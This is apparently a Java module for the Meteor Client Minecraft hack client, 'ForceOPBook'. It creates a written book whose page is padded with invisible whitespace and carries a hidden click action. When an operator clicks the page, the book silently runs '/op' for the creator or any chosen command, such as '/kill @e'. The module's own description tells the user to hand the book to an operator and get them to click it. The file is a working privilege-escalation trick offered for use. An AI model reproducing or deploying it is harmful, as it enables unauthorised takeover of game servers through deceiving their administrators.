package pwn.noobs.trouserstreak.modules;

import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import pwn.noobs.trouserstreak.Trouser;

public class ForceOPBook extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();
    private final Setting<Modes> mode = sgGeneral.add(new EnumSetting.Builder<Modes>()
            .name("Command Mode")
            .description("the mode")
            .defaultValue(Modes.ForceOP)
            .build());
    private final Setting<String> theCommand = sgGeneral.add(new StringSetting.Builder()
            .name("Command")
            .description("What command is run")
            .defaultValue("/kill @e")
            .visible(() -> mode.get() == Modes.AnyCommand)
            .build()
    );
    private final Setting<String> title = sgGeneral.add(new StringSetting.Builder()
            .name("Book Title")
            .description("The book's name")
            .defaultValue("Legal Document")
            .build()
    );
    private final Setting<String> author = sgGeneral.add(new StringSetting.Builder()
            .name("Book Author")
            .description("The book's author")
            .defaultValue("Satan")
            .build()
    );
    private final Setting<String> text = sgGeneral.add(new StringSetting.Builder()
            .name("Text")
            .description("What text is on the book's page")
            .defaultValue("§4Sign here to hand over your eternal soul ____________")
            .build()
    );

    public ForceOPBook() {
        super(Trouser.Main, "ForceOPBook", "Requires Creative mode! Creates a Book that can run commands in your inventory. Give it to someone with OP and have them click on the page in the book.");
    }

    @Override
    public void onActivate() {
        if (!mc.player.getAbilities().creativeMode) {
            error("You need creative mode to make the book.");
            toggle();
            return;
        }

        ItemStack stack = new ItemStack(Items.WRITTEN_BOOK);
        NbtCompound nbt = new NbtCompound();

        nbt.putString("title", title.get());
        nbt.putString("author", author.get());
        NbtList pages = new NbtList();
        if (mode.get() == Modes.ForceOP){
            String pageContent = "{\"text\":\""+text.get()+"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             "
                +"\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"/op "+mc.player.getName().getLiteralString()+"\"}}";
            pages.add(NbtString.of(pageContent));
        } else {
            String pageContent = "{\"text\":\""+text.get()+"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             "
                    +"\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\""+theCommand.get()+"\"}}";
            pages.add(NbtString.of(pageContent));
        }
        nbt.put("pages", pages);

        stack.setNbt(nbt);

        mc.interactionManager.clickCreativeStack(stack, 36 + mc.player.getInventory().selectedSlot);
        info("Book created.");

        toggle();
    }

    public enum Modes {
        ForceOP, AnyCommand
    }
}